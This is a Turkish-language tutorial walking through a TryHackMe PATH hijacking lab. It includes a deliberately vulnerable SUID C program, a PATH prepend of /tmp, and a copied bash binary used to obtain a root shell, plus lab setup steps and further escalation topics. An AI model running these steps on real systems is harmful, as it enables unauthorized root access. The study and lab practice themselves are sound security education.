### **Konu: PATH Hijacking ile Ayrıcalık Yükseltme**

Öncelikle temel mantığı sağlam bir zemine oturtalım. Bu zafiyetin ortaya çıkması için **iki ana unsurun** bir araya gelmesi gerekir:

1.  **SUID Biti Ayarlanmış Bir Dosya:** Normalde bir programı çalıştırdığınızda, o program sizin yetkilerinizle çalışır. Ancak bir programa **SUID (Set User ID)** biti atanmışsa, o program kim çalıştırırsa çalıştırsın, dosyanın **sahibinin** yetkileriyle çalışır. Eğer dosyanın sahibi `root` ise, program `root` yetkileriyle çalışır. Bu, normal bir kullanıcının geçici olarak `root` yetkilerine sahip olmasını sağlar (örneğin `passwd` komutu gibi).
    
2.  **Güvensiz Komut Çağrısı:** Bu `SUID` bitine sahip program, başka bir komutu veya programı çalıştırırken, o komutun tam yolunu (`/bin/ls`, `/usr/bin/find` gibi) belirtmek yerine sadece adını (`ls`, `find` gibi) kullanır.
    

İşte zafiyet tam bu noktada doğar. Sistem, adı verilen komutu nerede bulacağını nasıl bilir? Cevap: **`$PATH`** çevre değişkeninde.

#### **`$PATH` Değişkeni Nedir?**

`$PATH`, bir komut adı yazdığınızda sistemin o komuta ait çalıştırılabilir dosyayı arayacağı dizinlerin sıralı bir listesidir. Tıpkı bir telefon rehberi gibi, sistem bu listeyi baştan sona tarar ve komutu bulduğu ilk yerde aramayı durdurup onu çalıştırır.

Terminalinize `echo $PATH` yazarak kendi `PATH` listenizi görebilirsiniz:

Bash

```
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Bu çıktıya göre, eğer `thm` diye bir komut çalıştırırsam, sistem sırasıyla:

1.  `/usr/local/sbin/thm` var mı?
2.  `/usr/local/bin/thm` var mı?
3.  `/usr/sbin/thm` var mı? ... diye devam eder ve bulduğu ilk `thm`'yi çalıştırır.

* * *

### **TryHackMe Senaryosunun Adım Adım Analizi**

Şimdi TryHackMe'deki senaryoyu bu bilgilerle tekrar inceleyelim.

#### **Adım 1: Zafiyetli Programı Anlamak (`path` scripti)**

Size verilen C kodu şuydu:

C

```
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    system("thm"); // <-- Zafiyetin kalbi burası!
    return 0;
}
```

Bu program derlenip `path` adıyla kaydedilmiş ve en önemlisi, `root` kullanıcısı tarafından **SUID biti** ayarlanmış (`chmod u+s path`).

- `system("thm")`: Bu satır, sisteme "thm adında bir komut çalıştır" diyor. Ama `/bin/thm` veya `/usr/bin/thm` demiyor. Sadece `thm`. Bu yüzden sistem, bu `thm`'yi bulmak için `$PATH` listesini tarayacaktır.
- **SUID Biti:** Bu programı biz çalıştırsak bile, SUID biti nedeniyle `root` yetkileriyle çalışacak. Dolayısıyla, onun çalıştırdığı `thm` komutu da `root` yetkileriyle çalışacaktır!

#### **Adım 2: Saldırı Yüzeyini Keşfetmek (Yazılabilir Dizinler)**

Saldırgan olarak amacımız, sisteme sahte bir `thm` dosyası sunmak ve bunu gerçek olandan (eğer varsa) önce bulmasını sağlamak. Bunun için `$PATH` listesindeki dizinlerden birine yazma yetkimizin olması gerekir.

Ancak genelde bu dizinler (`/usr/bin`, `/bin` vb.) normal kullanıcıların yazmasına kapalıdır. Bu yüzden sistemde **herkesin yazabildiği** dizinleri ararız. En bilineni `/tmp` dizinidir.

TryHackMe'de gösterilen `find` komutu tam olarak bunu yapar:

Bash

```
find / -writable 2>/dev/null
```

- `find /`: Kök dizinden başlayarak her şeyi ara.
- `-writable`: Mevcut kullanıcının yazma yetkisi olduğu dosya/dizinleri bul.
- `2>/dev/null`: `find` komutu, arama sırasında erişim izni olmayan dizinlere rastladığında "Permission denied" hatası verir. `2>/dev/null` ifadesi, bu standart hata (stderr) çıktılarını ekrana basmak yerine "hiçlik kuyusuna" (`/dev/null`) göndererek temiz bir çıktı almamızı sağlar.

#### **Adım 3: `$PATH` Değişkenini Manipüle Etmek**

Diyelim ki `/tmp` dizinine yazma yetkimiz var (genellikle vardır). Ancak, standart `$PATH` çıktısında `/tmp` dizini bulunmaz. Öyleyse ne yapacağız? Onu kendimiz ekleyeceğiz!

Bash

```
export PATH=/tmp:$PATH
```

Bu komutun yaptığı sihirli dokunuş şudur:

- `export PATH=...`: `$PATH` değişkenini yeniden tanımlar.
- `/tmp:$PATH`: Yeni `$PATH` listesinin **en başına** `/tmp` dizinini ekler. Geri kalan liste (`$PATH` kısmı) eskisi gibi devam eder.

Şimdi yeni `$PATH` listemiz şuna benzer: `/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin...`

Artık sistem bir komut aradığında **ilk olarak `/tmp` dizinine bakacaktır!**

#### **Adım 4: Sahte Komutu (Payload) Oluşturmak**

Planımızın son adımı, `/tmp` dizininin içine `thm` adında kendi zararlı yazılımımızı koymaktır. Ayrıcalık yükseltme senaryolarında en yaygın "zararlı yazılım" aslında bize `root` olarak bir komut satırı (shell) veren `/bin/bash`'in bir kopyasıdır.

Bash

```
# /bin/bash'i /tmp dizinine "thm" adıyla kopyala
cp /bin/bash /tmp/thm

# Kopyaladığımız dosyayı çalıştırılabilir yap
chmod +x /tmp/thm
```

Artık `/tmp/thm` adında, aslında bir `bash` kabuğu olan çalıştırılabilir bir dosyamız var.

#### **Adım 5: Zafiyeti Tetiklemek ve `root` Olmak**

Tüm hazırlıklar tamam. Şimdi tek yapmamız gereken, SUID bitine sahip olan `./path` programını çalıştırmak.

Bash

```
./path
```

İşte bu komut çalıştığında olanlar:

1.  `./path` programı, SUID biti sayesinde `root` yetkileriyle çalışmaya başlar.
2.  İçindeki `system("thm")` komutuna gelir.
3.  Sistem, `thm`'yi bulmak için `$PATH` listesini taramaya başlar.
4.  `$PATH` listesinin en başında `/tmp` olduğu için ilk olarak `/tmp/thm` dosyasını bulur.
5.  `/tmp/thm` dosyasını (`root` yetkileriyle) çalıştırır.
6.  `/tmp/thm` aslında bir `bash` kabuğu olduğu için, size **`root` yetkilerine sahip** yeni bir komut satırı açılır!

Bunu doğrulamak için `whoami` komutunu çalıştırabilirsiniz:

Bash

```
# ./path'i çalıştırmadan önce
$ whoami
kullanici_adi

# ./path'i çalıştırdıktan sonra açılan yeni shell'de
# whoami
root
```

Tebrikler! `kullanici_adi` iken artık `root` oldunuz. 👑

* * *

### **Pratik Yapma Zamanı ve Sonraki Adımlar**

Bu konuyu gerçekten anlamanın en iyi yolu denemektir.

- **Kendi Laboratuvarını Kur:** Bir Linux sanal makinesi (Ubuntu, Debian vb.) kur. Yukarıdaki C kodunu `zafiyet.c` olarak kaydet.
    
    Bash
    
    ```
    # Derleme
    gcc zafiyet.c -o zafiyetli_program
    
    # Root kullanıcısına geç (sudo su) ve SUID bitini ayarla
    sudo chown root:root zafiyetli_program
    sudo chmod u+s zafiyetli_program
    ```
    
    Sonra normal kullanıcıya dönüp yukarıdaki adımları birebir uygula.
    
- **Kaynak Önerileri:**
    
    - **Lab:** **Hack The Box** ve **VulnHub** üzerinde bu tekniğin gerektiği çok sayıda makine bulabilirsin. Özellikle başlangıç seviyesindeki Linux makinelerinde sıkça karşına çıkar.
    - **Site/Repo:** **GTFOBins** (https://gtfobins.github.io/). Bu site, bir Linux komutunun `sudo` hakları veya SUID biti ile çalıştırıldığında yetki yükseltmek için nasıl kötüye kullanılabileceğini gösteren bir hazinedir. Mutlaka yer imlerine ekle.
    - **PayloadsAllTheThings (GitHub):** Bu devasa repoda da PATH Hijacking ve diğer birçok teknik için harika örnekler ve açıklamalar bulabilirsin.
- **Gelişim Seviyene Uygun Sonraki Konular:**
    
    1.  **Sudo Kurallarını Kötüye Kullanma:** `sudo -l` komutuyla bir kullanıcının hangi komutları şifresiz `sudo` ile çalıştırabildiğini gör ve GTFOBins kullanarak bundan nasıl faydalanabileceğini araştır.
    2.  **Cron Job (Zamanlanmış Görev) Zafiyetleri:** `root` tarafından çalıştırılan ve güvenli olmayan bir scripti (örneğin yolu tam belirtilmemiş bir komut içeren) sömürerek yetki yükseltme.
    3.  **LD_PRELOAD Hijacking:** `PATH` hijacking'e çok benzer, ancak bu kez paylaşımlı kütüphaneleri (.so dosyaları) hedef alır.